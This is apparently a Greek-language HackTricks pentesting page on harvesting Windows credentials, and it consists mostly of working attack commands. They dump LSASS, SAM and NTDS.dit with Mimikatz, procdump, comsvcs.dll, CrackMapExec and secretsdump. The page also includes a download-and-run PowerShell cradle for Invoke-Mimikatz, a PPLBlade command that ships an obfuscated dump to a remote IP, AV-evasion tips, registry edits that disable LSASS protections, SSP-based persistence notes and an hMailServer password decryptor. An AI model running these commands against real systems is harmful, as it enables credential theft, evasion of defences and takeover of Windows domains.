# Υποκλοπή διαπιστευτηρίων Windows

{{#include ../../banners/hacktricks-training.md}}

## Διαπιστευτήρια Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Βρείτε άλλα πράγματα που μπορεί να κάνει το Mimikatz σε** [**αυτή τη σελίδα**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Μάθετε για ορισμένες πιθανές προστασίες διαπιστευτηρίων εδώ.**](credentials-protections.md) **Αυτές οι προστασίες θα μπορούσαν να εμποδίσουν το Mimikatz να εξαγάγει ορισμένα διαπιστευτήρια.**

## Διαπιστευτήρια με Meterpreter

Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **που** έχω δημιουργήσει για να **αναζητήσετε κωδικούς πρόσβασης και hashes** μέσα στο θύμα.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Παράκαμψη AV

### Procdump + Mimikatz

Καθώς το [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**Procdump είναι ένα νόμιμο εργαλείο της Microsoft**, δεν εντοπίζεται από το Defender.\
Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **κάνετε dump τη διεργασία lsass**, να **κατεβάσετε το dump** και να **εξαγάγετε** τα **διαπιστευτήρια τοπικά** από το dump.

Μπορείτε επίσης να χρησιμοποιήσετε το [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Αυτή η διαδικασία εκτελείται αυτόματα με το [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Σημείωση**: Ορισμένα **AV** μπορεί να **ανιχνεύσουν** ως **κακόβουλη** τη χρήση του **procdump.exe για την απόρριψη του lsass.exe**, επειδή **ανιχνεύουν** τις συμβολοσειρές **"procdump.exe" και "lsass.exe"**. Επομένως, είναι πιο **stealthy** να **περάσετε** ως **όρισμα** στο procdump το **PID** του lsass.exe **αντί για** το **όνομα lsass.exe.**

### Απόρριψη του lsass με το **comsvcs.dll**

Ένα DLL με όνομα **comsvcs.dll**, το οποίο βρίσκεται στο `C:\Windows\System32`, είναι υπεύθυνο για την **απόρριψη της μνήμης διεργασίας** σε περίπτωση κατάρρευσης. Αυτό το DLL περιλαμβάνει μια **συνάρτηση** με όνομα **`MiniDumpW`**, η οποία έχει σχεδιαστεί ώστε να καλείται με χρήση του `rundll32.exe`.\
Τα δύο πρώτα ορίσματα δεν έχουν σημασία, αλλά το τρίτο αποτελείται από τρία στοιχεία. Το πρώτο στοιχείο είναι το ID της διεργασίας που θα απορριφθεί, το δεύτερο είναι η τοποθεσία του αρχείου dump και το τρίτο στοιχείο είναι υποχρεωτικά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
Αφού αναλύσει αυτά τα τρία στοιχεία, το DLL δημιουργεί το αρχείο dump και μεταφέρει σε αυτό τη μνήμη της καθορισμένης διεργασίας.\
Μπορείτε να χρησιμοποιήσετε το **comsvcs.dll** για να κάνετε dump τη διεργασία lsass, χωρίς να χρειάζεται να ανεβάσετε και να εκτελέσετε το procdump. Αυτή η μέθοδος περιγράφεται λεπτομερώς στη διεύθυνση [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Η ακόλουθη εντολή χρησιμοποιείται για την εκτέλεση:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία με** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass με το Task Manager**

1. Κάντε δεξί κλικ στη γραμμή εργασιών και επιλέξτε Task Manager
2. Κάντε κλικ στο More details
3. Αναζητήστε τη διεργασία "Local Security Authority Process" στην καρτέλα Processes
4. Κάντε δεξί κλικ στη διεργασία "Local Security Authority Process" και επιλέξτε "Create dump file".

### Dumping lsass με το procdump

Το [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα binary υπογεγραμμένο από τη Microsoft, το οποίο αποτελεί μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Ένα ήδη υπάρχον full-system crash dump ή ένα συμπιεσμένο αντίγραφο σε προσβάσιμο φάκελο χρήστη ενδέχεται να διατηρεί υλικό διαπιστευτηρίων για offline ανάλυση. Ονόματα αρχείων όπως `MEMORY.DMP` και `MEMORY.7z` αποτελούν μόνο ενδείξεις προς διερεύνηση: επαληθεύστε την προέλευση και την πρόσβαση και μην υποθέτετε ότι περιέχουν αξιοποιήσιμα ή τρέχοντα διαπιστευτήρια.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumpin lsass με PPLBlade

Το [**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα εργαλείο Protected Process Dumper που υποστηρίζει την απόκρυψη memory dump και τη μεταφορά του σε απομακρυσμένους σταθμούς εργασίας χωρίς να αποθηκεύεται στον δίσκο.

**Βασικές λειτουργίες**:

1. Παράκαμψη της προστασίας PPL
2. Απόκρυψη αρχείων memory dump για την αποφυγή μηχανισμών ανίχνευσης του Defender που βασίζονται σε signatures
3. Μεταφόρτωση memory dump με μεθόδους RAW και SMB χωρίς να αποθηκεύεται στον δίσκο (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – Dumping του LSASS με βάση SSP χωρίς MiniDumpWriteDump

Το Ink Dragon χρησιμοποιεί έναν dumper τριών σταδίων με την ονομασία **LalsDumper**, ο οποίος δεν καλεί ποτέ το `MiniDumpWriteDump`, οπότε δεν ενεργοποιούνται ποτέ τα EDR hooks σε αυτό το API:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – αναζητά στο `fdp.dll` ένα placeholder που αποτελείται από 32 πεζούς χαρακτήρες `d`, το αντικαθιστά με την απόλυτη διαδρομή προς το `rtu.txt`, αποθηκεύει το τροποποιημένο DLL ως `nfdp.dll` και καλεί το `AddSecurityPackageA("nfdp","fdp")`. Έτσι, το **LSASS** φορτώνει το κακόβουλο DLL ως νέο Security Support Provider (SSP).
2. **Stage 2 μέσα στο LSASS** – όταν το LSASS φορτώνει το `nfdp.dll`, το DLL διαβάζει το `rtu.txt`, κάνει XOR σε κάθε byte με `0x20` και αντιστοιχίζει το αποκωδικοποιημένο blob στη μνήμη πριν μεταφέρει την εκτέλεση.
3. **Stage 3 dumper** – το αντιστοιχισμένο payload επανυλοποιεί τη λογική του MiniDump χρησιμοποιώντας **direct syscalls** που εντοπίζονται μέσω hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ένα ειδικό export με την ονομασία `Tom` ανοίγει το `%TEMP%\<pid>.ddt`, γράφει σε αυτό ένα συμπιεσμένο LSASS dump και κλείνει το handle, ώστε να γίνει exfiltration αργότερα.

Σημειώσεις χειριστή:

* Διατηρήστε τα `lals.exe`, `fdp.dll`, `nfdp.dll` και `rtu.txt` στον ίδιο κατάλογο. Το Stage 1 αντικαθιστά το hard-coded placeholder με την απόλυτη διαδρομή προς το `rtu.txt`, επομένως ο διαχωρισμός τους διακόπτει την αλυσίδα.
* Η καταχώριση γίνεται με την προσθήκη του `nfdp` στο `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Μπορείτε να ορίσετε εσείς αυτήν την τιμή, ώστε το LSASS να φορτώνει ξανά το SSP σε κάθε εκκίνηση.
* Τα αρχεία `%TEMP%\*.ddt` είναι συμπιεσμένα dumps. Αποσυμπιέστε τα τοπικά και, στη συνέχεια, δώστε τα στο Mimikatz/Volatility για εξαγωγή διαπιστευτηρίων.
* Για να εκτελεστεί το `lals.exe`, απαιτούνται δικαιώματα admin/SeTcb, ώστε να πετύχει το `AddSecurityPackageA`. Μόλις επιστρέψει η κλήση, το LSASS φορτώνει διαφανώς το rogue SSP και εκτελεί το Stage 2.
* Η αφαίρεση του DLL από τον δίσκο δεν το απομακρύνει από το LSASS. Διαγράψτε την καταχώριση μητρώου και επανεκκινήστε το LSASS (επανεκκίνηση συστήματος) ή αφήστε το για μακροχρόνια persistence.

## CrackMapExec

### Dump των SAM hashes

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump του NTDS.dit από τον DC-στόχο

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump του ιστορικού κωδικών πρόσβασης του NTDS.dit από τον DC-στόχο

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Εμφάνιση του χαρακτηριστικού pwdLastSet για κάθε λογαριασμό του NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Κλοπή των SAM & SYSTEM

Αυτά τα αρχεία θα πρέπει να **βρίσκονται** στα _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM._ Ωστόσο, **δεν μπορείτε απλώς να τα αντιγράψετε με τον συνηθισμένο τρόπο**, επειδή είναι προστατευμένα.

### Από το μητρώο

Ο ευκολότερος τρόπος να κλέψετε αυτά τα αρχεία είναι να πάρετε ένα αντίγραφο από το μητρώο:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Κατεβάστε** αυτά τα αρχεία στον υπολογιστή σας με Kali και **εξαγάγετε τα hashes** χρησιμοποιώντας:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Μπορείτε να αντιγράψετε προστατευμένα αρχεία χρησιμοποιώντας αυτήν την υπηρεσία. Πρέπει να είστε Διαχειριστής.

#### Using vssadmin

Το δυαδικό αρχείο vssadmin είναι διαθέσιμο μόνο σε εκδόσεις Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Αλλά μπορείτε να κάνετε το ίδιο και από το **Powershell**. Αυτό είναι ένα παράδειγμα του **πώς να αντιγράψετε το αρχείο SAM** (ο δίσκος που χρησιμοποιείται είναι ο "C:" και το αρχείο αποθηκεύεται στο C:\users\Public), αλλά μπορείτε να το χρησιμοποιήσετε για να αντιγράψετε οποιοδήποτε προστατευμένο αρχείο:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Τέλος, θα μπορούσατε επίσης να χρησιμοποιήσετε το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να δημιουργήσετε ένα αντίγραφο των SAM, SYSTEM και ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Διαπιστευτήρια Active Directory - NTDS.dit**

Το αρχείο **NTDS.dit** είναι γνωστό ως η καρδιά του **Active Directory** και περιέχει κρίσιμα δεδομένα σχετικά με αντικείμενα χρηστών, ομάδες και τη συμμετοχή τους σε αυτές. Εκεί αποθηκεύονται τα **password hashes** των χρηστών του domain. Αυτό το αρχείο είναι μια βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στη διαδρομή **_%SystemRoom%/NTDS/ntds.dit_**.

Σε αυτή τη βάση δεδομένων διατηρούνται τρεις κύριοι πίνακες:

- **Data Table**: Αυτός ο πίνακας αποθηκεύει λεπτομέρειες για αντικείμενα, όπως χρήστες και ομάδες.
- **Link Table**: Καταγράφει σχέσεις, όπως τη συμμετοχή σε ομάδες.
- **SD Table**: Εδώ αποθηκεύονται οι **security descriptors** για κάθε αντικείμενο, διασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης στα αποθηκευμένα αντικείμενα.

Η έρευνα του Christoffer Andersson στο επίπεδο της βάσης δεδομένων τεκμηριώνει αυτούς τους πίνακες και τη συμπεριφορά τους ανά έκδοση με περισσότερες λεπτομέρειες.<sup>[[8]](#references)</sup>

Τα Windows χρησιμοποιούν το _Ntdsa.dll_ για να αλληλεπιδρούν με αυτό το αρχείο, ενώ το χρησιμοποιεί και το _lsass.exe_. Επομένως, **μέρος** του αρχείου **NTDS.dit** μπορεί να βρίσκεται **στη μνήμη του `lsass`** (πιθανότατα μπορείτε να βρείτε τα δεδομένα στα οποία έγινε πρόσβαση πιο πρόσφατα, λόγω της βελτίωσης της απόδοσης μέσω της χρήσης **cache**).

#### Αποκρυπτογράφηση των hashes μέσα στο NTDS.dit

Το hash κρυπτογραφείται τρεις φορές:

1. Αποκρυπτογραφήστε το Password Encryption Key (**PEK**) χρησιμοποιώντας το **BOOTKEY** και το **RC4**.
2. Αποκρυπτογραφήστε το **hash** χρησιμοποιώντας το **PEK** και το **RC4**.
3. Αποκρυπτογραφήστε το **hash** χρησιμοποιώντας το **DES**.

Το **PEK** έχει την **ίδια τιμή σε κάθε domain controller**, αλλά είναι **κρυπτογραφημένο** μέσα στο **NTDS.dit** με το ειδικό για τον DC **BOOTKEY** από το **SYSTEM** hive αυτού του domain controller. Επομένως, για την εξαγωγή διαπιστευτηρίων απαιτούνται τόσο το **NTDS.dit** όσο και το **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Μια ξεχωριστή [kernel handle-table redirection technique](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) μπορεί να αντιγράψει ένα ήδη ανοιχτό NTDS file object χωρίς VSS, αλλά απαιτεί ένα arbitrary kernel read/write primitive στον domain controller.<sup>[[16]](#references)</sup>

### Αντιγραφή του NTDS.dit χρησιμοποιώντας το Ntdsutil

Διαθέσιμο από τα Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Θα μπορούσατε επίσης να χρησιμοποιήσετε το κόλπο του [**volume shadow copy**](#stealing-sam-and-system) για να αντιγράψετε το αρχείο **ntds.dit**. Να θυμάστε ότι θα χρειαστείτε επίσης ένα αντίγραφο του **αρχείου SYSTEM** (και πάλι, χρησιμοποιήστε το κόλπο [**να το κάνετε dump από το registry ή να χρησιμοποιήσετε το volume shadow copy**](#stealing-sam-and-system)).

### **Εξαγωγή hashes από το NTDS.dit**

Μόλις **αποκτήσετε** τα αρχεία **NTDS.dit** και **SYSTEM**, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **εξαγάγετε τα hashes**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Μπορείτε επίσης να **τα εξαγάγετε αυτόματα** χρησιμοποιώντας έναν έγκυρο χρήστη domain admin:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Για **μεγάλα αρχεία NTDS.dit** συνιστάται η εξαγωγή τους με το [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ή το **mimikatz** `lsadump::lsa /inject`

### **Εξαγωγή αντικειμένων τομέα από το NTDS.dit σε βάση δεδομένων SQLite**

Τα αντικείμενα NTDS μπορούν να εξαχθούν σε βάση δεδομένων SQLite με το [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Δεν εξάγονται μόνο secrets, αλλά και ολόκληρα τα αντικείμενα μαζί με τα χαρακτηριστικά τους, ώστε να εξαχθούν περαιτέρω πληροφορίες όταν έχει ήδη ανακτηθεί το αρχικό αρχείο NTDS.dit.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Το hive `SYSTEM` είναι προαιρετικό, αλλά επιτρέπει την αποκρυπτογράφηση secrets (hashes NT & LM, συμπληρωματικά διαπιστευτήρια όπως κωδικούς πρόσβασης σε cleartext, κλειδιά kerberos ή trust, ιστορικά κωδικών πρόσβασης NT & LM). Μεταξύ άλλων πληροφοριών, εξάγονται τα ακόλουθα δεδομένα: λογαριασμοί χρηστών και μηχανημάτων με τα hashes τους, flags UAC, χρονική σήμανση τελευταίας σύνδεσης και αλλαγής κωδικού πρόσβασης, περιγραφές λογαριασμών, ονόματα, UPN, SPN, ομάδες και αναδρομικές συμμετοχές, δέντρο organizational units και συμμετοχές, trusted domains με τύπο, κατεύθυνση και χαρακτηριστικά trust...

## Lazagne

Κατεβάστε το binary από [εδώ](https://github.com/AlessandroZ/LaZagne/releases). Μπορείτε να χρησιμοποιήσετε αυτό το binary για να εξαγάγετε διαπιστευτήρια από διάφορα λογισμικά.

```
lazagne.exe all
```

## Άλλα εργαλεία για την εξαγωγή διαπιστευτηρίων από τα SAM και LSASS

### Windows credentials Editor (WCE)

Αυτό το εργαλείο μπορεί να χρησιμοποιηθεί για την εξαγωγή διαπιστευτηρίων από τη μνήμη. Κατεβάστε το από: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Εξαγωγή διαπιστευτηρίων από το αρχείο SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Κατεβάστε το από: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) και απλώς **εκτελέστε το** για να εξαχθούν οι κωδικοί πρόσβασης.

## Συλλογή δεδομένων από αδρανείς συνεδρίες RDP και αποδυνάμωση των ελέγχων ασφαλείας

Το FinalDraft RAT του Ink Dragon περιλαμβάνει ένα tasker `DumpRDPHistory`, του οποίου οι τεχνικές είναι χρήσιμες για κάθε red-teamer:<sup>[[3]](#references)</sup>

### Συλλογή τηλεμετρίας τύπου DumpRDPHistory

* **Εξερχόμενοι στόχοι RDP** – αναλύστε κάθε hive χρήστη στο `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Κάθε subkey αποθηκεύει το όνομα του server, το `UsernameHint` και τη χρονική σήμανση της τελευταίας εγγραφής. Μπορείτε να αναπαραγάγετε τη λογική του FinalDraft με PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Ενδείξεις εισερχόμενων συνδέσεων RDP** – αναζητήστε στο αρχείο καταγραφής `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` τα Event IDs **21** (επιτυχής σύνδεση) και **25** (αποσύνδεση), για να χαρτογραφήσετε ποιοι διαχειρίζονταν το σύστημα:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Μόλις μάθετε ποιος Domain Admin συνδέεται τακτικά, κάντε dump το LSASS (με LalsDumper/Mimikatz) όσο η **αποσυνδεδεμένη** συνεδρία του εξακολουθεί να υπάρχει. Το CredSSP + η εναλλακτική NTLM αφήνουν το verifier και τα tokens του στο LSASS, όπου μπορούν έπειτα να επαναχρησιμοποιηθούν μέσω SMB/WinRM για την απόκτηση του `NTDS.dit` ή για την εγκατάσταση persistence σε domain controllers.

### Υποβαθμίσεις μητρώου που στοχεύει το FinalDraft

Το ίδιο implant αλλοιώνει επίσης αρκετά κλειδιά μητρώου, ώστε να διευκολύνει την κλοπή διαπιστευτηρίων:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Το `DisableRestrictedAdmin=1` απενεργοποιεί το Restricted Admin για εισερχόμενες συνδέσεις RDP· **δεν** ενεργοποιεί το pass-the-hash μέσω αυτής της λειτουργίας. Η ρύθμιση της τιμής σε `0` επιτρέπει το Restricted Admin στον προορισμό, αλλά ο client πρέπει να ζητήσει `/RestrictedAdmin` ή να χρησιμοποιεί πολιτική που απαιτεί το Restricted Admin.<sup>[[14]](#references)</sup> Ένα hash από μόνο του δεν παρέχει απομακρυσμένα δικαιώματα διαχειριστή· δείτε τις [προϋποθέσεις ελέγχου ταυτότητας RDP](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* Το `LocalAccountTokenFilterPolicy=1` απενεργοποιεί το φιλτράρισμα διακριτικών UAC, ώστε οι τοπικοί διαχειριστές να λαμβάνουν μη περιορισμένα διακριτικά μέσω δικτύου.
* Το `DSRMAdminLogonBehavior=2` επιτρέπει στον διαχειριστή DSRM να συνδεθεί ενώ ο DC είναι σε λειτουργία, δίνοντας στους επιτιθέμενους έναν ακόμη ενσωματωμένο λογαριασμό με υψηλά προνόμια.
* Το `RunAsPPL=0` καταργεί τις προστασίες LSASS PPL, καθιστώντας την πρόσβαση στη μνήμη παιχνιδάκι για εργαλεία εξαγωγής dump όπως το LalsDumper.

## Διαπιστευτήρια διαμόρφωσης hMailServer (μετά την παραβίαση)

Ελέγξτε τα ακριβή αρχεία διαμόρφωσης `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` και `C:\ProgramData\hMailServer\hMailServer.ini`, ανάλογα με τη διάταξη της εγκατάστασης. Μια αναγνώσιμη, μη κενή τιμή `[Security] AdministratorPassword=` είναι hash κωδικού πρόσβασης διαχείρισης hMailServer· δεν αποτελεί ένδειξη κωδικού πρόσβασης Windows Administrator. Αν ανακτηθεί αυτό το διαπιστευτήριο, κάθε μετάβαση σε λογαριασμό Windows απαιτεί ανεξάρτητη επαλήθευση επαναχρησιμοποίησης κωδικού πρόσβασης και δικαιωμάτων σύνδεσης.

Για εγκαταστάσεις που χρησιμοποιούν βάση δεδομένων SQL CE, η ξεχωριστή τιμή `[Database] Password=` στο INI προστατεύει τη βάση δεδομένων. Σε παλαιότερες εγκαταστάσεις, αυτή η τιμή είναι κρυπτογραφημένη με Blowfish χρησιμοποιώντας το στατικό κλειδί `THIS_KEY_IS_NOT_SECRET` και εναλλαγές endianness λέξεων των 4 byte. Χρησιμοποιήστε τη συμβολοσειρά hex από το INI με αυτό το απόσπασμα Python:<sup>[[2]](#references)</sup>

Πρώτα επιβεβαιώστε ότι ο τρέχων λογαριασμός μπορεί να διαβάσει **τόσο** το INI όσο και το αντίστοιχο αρχείο βάσης δεδομένων SQL CE `.sdf`. Ο κωδικός πρόσβασης του INI προστατεύει τη βάση δεδομένων· είναι ξεχωριστός από τα hash των λογαριασμών γραμματοκιβωτίου που είναι αποθηκευμένα σε αυτήν. Επιθεωρήστε ή αναβαθμίστε ένα **αντίγραφο** μιας βάσης δεδομένων που χρησιμοποιείται· ποτέ το ενεργό αρχείο.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Με τον κωδικό πρόσβασης σε απλό κείμενο, αντιγράψτε τη βάση δεδομένων SQL CE για να αποφύγετε το κλείδωμα του αρχείου, φορτώστε τον 32-bit provider και κάντε αναβάθμιση, αν χρειάζεται, πριν αναζητήσετε hashes:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Η στήλη `accountpassword` χρησιμοποιεί τη μορφή hash του hMailServer (λειτουργία hashcat `1421`). Ένας κωδικός πρόσβασης mailbox που έχει γίνει crack αποτελεί τρόπο μετάβασης σε λογαριασμό χρήστη Windows μόνο αν ο ίδιος κωδικός χρησιμοποιείται ξανά από έναν τοπικό λογαριασμό ή λογαριασμό τομέα και ο συγκεκριμένος λογαριασμός έχει τα απαιτούμενα δικαιώματα απομακρυσμένης σύνδεσης.

## Interception callback σύνδεσης LSA (LsaApLogonUserEx2)

Ορισμένα εργαλεία καταγράφουν **κωδικούς πρόσβασης σύνδεσης σε plaintext** παρεμβάλλοντας το callback σύνδεσης LSA `LsaApLogonUserEx2`. Η ιδέα είναι να γίνει hook ή wrap στο callback του πακέτου ελέγχου ταυτότητας, ώστε να καταγραφούν τα διαπιστευτήρια **κατά τη σύνδεση** (πριν από το hashing) και στη συνέχεια να εγγραφούν στον δίσκο ή να επιστραφούν στον χειριστή. Συνήθως υλοποιείται ως βοηθητικό πρόγραμμα που κάνει inject στο LSA ή εγγράφεται σε αυτό και, στη συνέχεια, καταγράφει κάθε επιτυχημένο συμβάν διαδραστικής σύνδεσης ή σύνδεσης μέσω δικτύου, μαζί με το username, το domain και τον κωδικό πρόσβασης.<sup>[[1]](#references)</sup>

Λειτουργικές σημειώσεις:
- Απαιτούνται δικαιώματα local admin/SYSTEM για τη φόρτωση του βοηθητικού προγράμματος στη διαδρομή ελέγχου ταυτότητας.
